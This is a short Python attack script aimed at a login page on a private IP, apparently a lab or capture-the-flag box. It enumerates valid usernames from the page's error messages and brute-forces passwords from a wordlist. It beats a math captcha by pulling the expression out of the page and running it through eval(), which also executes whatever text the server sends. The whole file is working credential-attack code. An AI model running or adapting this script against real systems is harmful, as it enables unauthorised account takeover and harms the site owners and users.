import requests
import time
import argparse

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    }

url='http://10.10.107.242/login'
usernames_file='usernames.txt'
passwords_file='passwords.txt'

def username_enumeration():
    valid = []
    with open(usernames_file, 'r')  as users:
        for user in users:
            user = user.strip('\n')
            data = {'username': user,
                    'password': 'password'}
            response = requests.post(url, headers=headers, data=data)
            #print(response.text)
            captcha_text = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
            if captcha_text in response.text:
#                print('CAPTURE!!!!!!!!!!!!!!!!')
                #print(response.text.find(captcha_text))
                exp_start = response.text.find(captcha_text) + len(captcha_text)
                exp_end = response.text.find('=', exp_start)
                captcha = response.text[exp_start:exp_end].strip()
                answer = f'{captcha} = {eval(captcha)}'
                data['captcha'] = answer.split()[-1]
                #print(data)
            send_answer = requests.post(url, headers=headers, data=data)
            if 'does not exist' in send_answer.text:
                print("[-] Try to use: %s " %user)
            else:
                print("[+] Try to use: %s " %user)
                valid.append(user)
        return ''.join(valid)

def password_enumeration(user):
    with open(passwords_file, 'r') as passwords:
        for password in passwords:
            password = password.strip('\n')
            data = {'username' : user,
                    'password' : password}
            response = requests.post(url, headers=headers, data=data)
            captcha_text = '<label for="usr"><b><h3>Captcha enabled</h3></b></label><br>'
            if captcha_text in response.text:
                exp_start = response.text.find(captcha_text) + len(captcha_text)
                exp_end = response.text.find('=', exp_start)
                captcha = response.text[exp_start:exp_end].strip()
                answer = f'{captcha} = {eval(captcha)}'
                data['captcha'] = answer.split()[-1]
            send_answer = requests.post(url, headers=headers, data=data)
            if not 'Invalid password for user' in send_answer.text:
                print(send_answer.text)
valid_user = username_enumeration()
password_enumeration(valid_user)
